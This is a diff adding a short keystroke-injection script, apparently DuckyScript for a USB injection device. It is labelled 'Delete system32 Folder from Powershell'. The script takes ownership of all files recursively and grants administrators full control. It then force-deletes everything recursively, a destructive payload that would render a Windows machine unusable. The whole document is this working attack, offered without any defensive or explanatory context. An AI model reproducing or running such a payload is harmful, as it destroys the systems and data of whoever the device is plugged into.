@@ -1,0 +1,5 @@
+REM Delete system32 Folder from Powershell
+
+ALTSTRING takeown /f * /r /a /d j; icacls * /inheritance:r /grant "Administratoren:(F)" /t; remove-Item * -Recurse -Force
+DELAY 1000
+ENTER
